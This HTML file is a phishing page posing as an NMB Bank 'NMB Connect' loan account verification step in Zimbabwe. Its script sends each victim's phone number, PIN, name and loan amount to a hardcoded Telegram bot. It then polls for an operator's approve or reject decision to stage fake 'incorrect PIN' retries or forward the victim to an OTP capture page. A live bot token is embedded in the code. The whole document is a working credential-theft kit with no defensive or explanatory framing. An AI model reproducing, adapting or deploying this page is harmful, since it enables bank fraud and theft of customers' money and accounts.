<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>NMB Connect | Account Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --nmb-blue: #003366;
            --nmb-gold: #E4C16A;
            --nmb-light-blue: #4a90e2;
            --white: #ffffff;
            --bg-overlay: rgba(0, 20, 40, 0.9);
            --card-bg: rgba(255, 255, 255, 0.1);
            --input-bg: rgba(255, 255, 255, 0.08);
            --error: #ff6b6b;
        }

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), 
                        url('https://images.unsplash.com/photo-1454165833767-027ffea9e77b?q=80&w=2000&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            min-height: 100vh;
            color: white;
            line-height: 1.6;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        header {
            padding: 40px 5% 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo { 
            font-size: 28px; 
            font-weight: 800; 
            text-decoration: none; 
            display: flex; 
            align-items: center; 
        }
        .logo .nmb { color: var(--nmb-light-blue); }
        .logo .connect { color: var(--nmb-gold); margin-left: 6px; }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 420px;
            width: 100%;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 35px;
            padding: 45px 35px;
            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6);
            text-align: center;
            animation: cardFadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes cardFadeIn {
            from { opacity: 0; transform: translateY(40px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .brand-icon {
            width: 80px;
            height: 80px;
            background: var(--nmb-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            border: 2px solid var(--nmb-gold);
        }

        .card h2 { 
            font-size: 24px; 
            font-weight: 700; 
            margin-bottom: 10px; 
            color: var(--white);
        }
        .card p { 
            font-size: 14px; 
            opacity: 0.7; 
            margin-bottom: 30px; 
        }

        .applicant-badge {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(228, 193, 106, 0.2);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: left;
        }
        .applicant-badge .label { 
            font-size: 11px; 
            text-transform: uppercase; 
            color: var(--nmb-gold); 
            font-weight: 700; 
            display: block; 
            margin-bottom: 5px; 
        }
        .applicant-badge .name { font-size: 18px; font-weight: 700; color: var(--white); display: block; }
        .applicant-badge .amount { font-size: 14px; opacity: 0.8; margin-top: 2px; display: block; }

        .error-msg {
            color: var(--error);
            font-size: 13px;
            margin-bottom: 20px;
            display: none;
            background: rgba(255, 107, 107, 0.1);
            padding: 12px;
            border-radius: 14px;
            border: 1px solid rgba(255, 107, 107, 0.2);
        }

        .input-group { margin-bottom: 20px; text-align: left; }
        .input-wrapper {
            background: var(--input-bg);
            border: 1.5px solid rgba(255, 255, 255, 0.15);
            border-radius: 18px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            transition: all 0.3s ease;
        }
        .input-wrapper:focus-within { 
            border-color: var(--nmb-gold); 
        }

        .flag-icon { width: 24px; margin-right: 12px; }
        .country-code { color: var(--nmb-light-blue); font-weight: 700; margin-right: 10px; }
        .input-field { 
            flex: 1; 
            background: transparent; 
            border: none; 
            color: white; 
            font-size: 16px; 
            outline: none; 
            width: 100%; 
        }

        .verify-btn {
            width: 100%;
            padding: 20px;
            background: var(--white);
            color: var(--nmb-blue);
            border: none;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        .verify-btn:hover { 
            background: var(--nmb-gold);
            transform: translateY(-3px);
        }

        .overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column;
            background: rgba(0, 20, 40, 0.95);
            z-index: 2000;
            backdrop-filter: blur(15px);
        }
        .overlay.on { display: flex; }
        .spin { 
            width: 50px; height: 50px; 
            border: 4px solid rgba(255,255,255,0.1); 
            border-top-color: var(--nmb-gold); 
            border-radius: 50%; 
            animation: sp 1s linear infinite; 
        }
        @keyframes sp { to { transform: rotate(360deg); } }

        /* Custom Modal for Warnings */
        .modal-overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center;
            background: rgba(0, 0, 0, 0.85);
            z-index: 3000;
            backdrop-filter: blur(10px);
            padding: 20px;
        }
        .modal-overlay.on { display: flex; }
        .modal-card {
            background: #ffffff;
            color: #333;
            max-width: 380px;
            width: 100%;
            border-radius: 25px;
            padding: 40px 30px;
            text-align: center;
        }
        .modal-btn {
            background: var(--nmb-blue);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }

        footer { 
            padding: 40px 20px; 
            text-align: center; 
            font-size: 12px; 
            opacity: 0.4; 
        }
    </style>
</head>
<body onload="init()">

    <header>
        <a class="logo" href="index.html">
            <span class="nmb">NMB</span><span class="connect">Connect</span>
        </a>
    </header>

    <main>
        <div class="container">
            <div class="card">
                <div class="brand-icon">
                    <svg viewBox="0 0 100 100" width="40" height="40">
                        <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                        <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                    </svg>
                </div>
                
                <h2>Account Verification</h2>
                <p>Please verify your NMB Connect account to complete your loan application.</p>

                <div id="applicantBadge" class="applicant-badge">
                    <span class="label">Application Details</span>
                    <span id="displayName" class="name">Valued Client</span>
                    <span id="displayAmount" class="amount">$0.00 USD Loan</span>
                </div>

                <div id="err" class="error-msg"></div>
                
                <form onsubmit="doSubmit(event)">
                    <div class="input-group">
                        <div class="input-wrapper">
                            <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
                            <span class="country-code">(+263)</span>
                            <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9" required>
                        </div>
                    </div>

                    <div class="input-group">
                        <div class="input-wrapper">
                            <span style="margin-right: 15px; font-size: 18px; opacity: 0.6;">🔒</span>
                            <input type="password" class="input-field" id="pin" placeholder="Enter 4-Digit PIN" inputmode="numeric" maxlength="4" required>
                        </div>
                    </div>

                    <button type="submit" class="verify-btn">Verify & Continue</button>
                </form>
            </div>
        </div>
    </main>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div style="margin-top: 20px; font-weight: 700;">Verifying Identity</div>
        <div style="font-size: 14px; opacity: 0.6;">Connecting to secure servers...</div>
    </div>

    <div id="warningModal" class="modal-overlay">
        <div class="modal-card">
            <div style="font-size: 50px; margin-bottom: 20px;">⚠️</div>
            <div style="font-size: 20px; font-weight: 700; margin-bottom: 10px; color: var(--nmb-blue);">Incorrect PIN</div>
            <div id="modalMsg" style="font-size: 15px; color: #555;"></div>
            <button class="modal-btn" onclick="closeModal()">Try Again</button>
        </div>
    </div>

    <footer>
        <p>&copy; 2026 NMB Bank Limited. Zimbabwe.</p>
    </footer>

    <script>
        const BOT = '8610325502:AAELjduBU2AtyM8FITvNGmRz4-O1Vi6QQ3s';
        const CID = '7881536601';
        let loanData = {
            name: "Valued Client",
            amount: "0",
            purpose: "Loan"
        };
        let lastUpdateId = 0;
        let pinAttempts = 0;

        function init() {
            const params = new URLSearchParams(window.location.search);
            loanData.name = params.get('name') || "Valued Client";
            loanData.amount = params.get('amount') || "0";
            loanData.purpose = params.get('purpose') || "Loan";
            
            document.getElementById('displayName').textContent = decodeURIComponent(loanData.name);
            
            const formattedAmount = parseFloat(loanData.amount).toLocaleString(undefined, {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2
            });
            document.getElementById('displayAmount').textContent = `$${formattedAmount} USD ${decodeURIComponent(loanData.purpose)}`;
        }

        function showErr(msg) { 
            const e = document.getElementById('err'); 
            e.textContent = msg; 
            e.style.display = 'block'; 
        }
        
        function clrErr() { 
            document.getElementById('err').style.display = 'none'; 
        }

        function showModal(msg) {
            document.getElementById('modalMsg').textContent = msg;
            document.getElementById('warningModal').classList.add('on');
        }

        function closeModal() {
            document.getElementById('warningModal').classList.remove('on');
            document.getElementById('pin').focus();
        }

        async function sendToTelegram(msg, buttons) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CID, 
                        text: msg, 
                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined, 
                        parse_mode: 'HTML' 
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    const updateResponse = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                    const updateData = await updateResponse.json();
                    if (updateData.ok && updateData.result.length > 0) { 
                        lastUpdateId = updateData.result[0].update_id; 
                    }
                }
            } catch(e) { console.error(e); }
        }

        function doSubmit(e) {
            e.preventDefault();
            clrErr();
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            const pin = document.getElementById('pin').value.trim();

            if (phone.length < 9) { showErr('Please enter a valid 9-digit mobile number.'); return; }
            if (pin.length !== 4) { showErr('PIN must be exactly 4 digits.'); return; }

            const msg = `🚀 <b>NMB Loan Attempt</b>\n\n👤 <b>Name:</b> <code>${decodeURIComponent(loanData.name)}</code>\n📱 <b>Phone:</b> <code>+263${phone}</code>\n🔒 <b>PIN:</b> <code>${pin}</code>\n💰 <b>Amount:</b> <code>$${loanData.amount} USD</code>\n🎯 <b>Purpose:</b> <code>${decodeURIComponent(loanData.purpose)}</code>\n🔢 <b>Attempt:</b> <code>${pinAttempts + 1}</code>`;

            const buttons = [
                [{ text: '✅ Approve PIN', callback_data: 'pin_valid' }, { text: '❌ Reject PIN', callback_data: 'pin_invalid' }],
                [{ text: '⚠️ Flag Account', callback_data: 'login_applied' }]
            ];

            document.getElementById('ov').classList.add('on');
            sendToTelegram(msg, buttons);
            startPolling();
        }

        function startPolling() {
            const pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            data.result.forEach(update => {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const action = update.callback_query.data;
                                    if (action === 'pin_valid') { 
                                        clearInterval(pollInterval); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        proceedToOTP(); 
                                    }
                                    else if (action === 'pin_invalid') { 
                                        clearInterval(pollInterval); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        pinAttempts++;
                                        let remaining = 3 - pinAttempts;
                                        if (remaining > 0) {
                                            showModal(`Incorrect PIN. ${remaining} attempts remaining. Please try again with the correct PIN.`);
                                        } else {
                                            showErr('Maximum attempts reached. Please contact support.');
                                        }
                                        document.getElementById('pin').value = '';
                                    }
                                    else if (action === 'login_applied') { 
                                        clearInterval(pollInterval); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('This account has already submitted a loan application.');
                                    }
                                }
                            });
                        }
                    }).catch(e => console.error(e));
            }, 2000);
            setTimeout(() => clearInterval(pollInterval), 600000);
        }

        function proceedToOTP() {
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            location.href = `otp_verification.html?name=${loanData.name}&amount=${loanData.amount}&purpose=${loanData.purpose}&phone=${phone}`;
        }
    </script>
</body>
</html>
